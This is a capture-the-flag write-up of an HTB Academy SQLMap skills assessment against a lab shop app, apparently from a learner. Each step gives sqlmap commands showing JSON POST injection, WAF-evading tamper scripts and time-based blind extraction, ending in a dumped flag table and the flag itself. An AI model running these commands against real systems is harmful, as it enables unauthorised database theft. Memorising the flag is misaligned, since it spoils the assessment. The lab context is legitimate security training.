# HTB Academy — SQLMap Essentials Skills Assessment

**Target:** `154.57.164.77:30347`  
**App:** Minishop — e-commerce web application  
**Flag:** `HTB{n07_50_h4rd_r16h7?!}`

---

## Attack Chain

### 1. Recon — Map the App
```
/ → static HTML homepage, no forms
/shop.html → JS calls action.php via POST with JSON body: {"id": 1}
             Content-Type: application/json
```

Key finding in `shop.html` source:
```javascript
let url = "action.php";
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json");
var data = JSON.stringify({ "id": 1 });
xhr.send(data);
```

### 2. Initial SQLMap — Failed
```bash
sqlmap -u "http://TARGET/action.php" --data='{"id": 1}' \
  -H "Content-Type: application/json" --batch --dbs
```
Result: `parameter does not appear to be injectable` — WAF blocking at default level.

### 3. Escalate — Level/Risk + Tamper — Too Slow
```bash
sqlmap ... --level=5 --risk=3 --tamper=space2comment --random-agent --dbs
```
Result: Ran for 20+ minutes on boolean-based blind. Problem: page returns **empty content**, making boolean-based unreliable. Killed.

### 4. Switch to Time-Based Blind Only
```bash
sqlmap -u "http://TARGET/action.php" --data='{"id": 1}' \
  -H "Content-Type: application/json" --batch \
  --technique=T --tamper=space2comment --random-agent --dbs
```
Result: Injection confirmed — `MySQL >= 5.0.12 AND time-based blind (query SLEEP)`  
Warning: `>` character is filtered → need `--tamper=between`  
Data retrieval failing → need `--hex`

### 5. Add Missing Tampers — Get Databases
```bash
sqlmap -u "http://TARGET/action.php" --data='{"id": 1}' \
  -H "Content-Type: application/json" --batch \
  --technique=T --tamper=between,space2comment --random-agent --hex --dbs
```
Result:
```
[*] information_schema
[*] production
```

### 6. Dump final_flag Table
```bash
sqlmap -u "http://TARGET/action.php" --data='{"id": 1}' \
  -H "Content-Type: application/json" --batch \
  --technique=T --tamper=between,space2comment --random-agent --hex \
  -D production -T final_flag --dump
```
Result:
```
+----+-----------------------------+
| id | content                     |
+----+-----------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!}    |
+----+-----------------------------+
```

---

## Key Lessons

- **JSON POST bodies are injectable** — sqlmap detects and processes them automatically when `Content-Type: application/json` is set
- **Empty response body = boolean-based blind is useless** — switch to `--technique=T` immediately when the page returns no content; boolean-based needs response differences to work
- **`>` filtered = add `--tamper=between`** — sqlmap warns about this explicitly; `between` replaces `>` with `BETWEEN x AND y`
- **Time-based data retrieval failing = add `--hex`** — hex-encodes extracted data to avoid character filtering issues during retrieval
- **Final tamper combo for this WAF:** `--tamper=between,space2comment --random-agent --hex --technique=T`
- **Don't run level=5/risk=3 blindly on empty-response targets** — it burns 20+ minutes on techniques that can't work; read the response first and pick the right technique
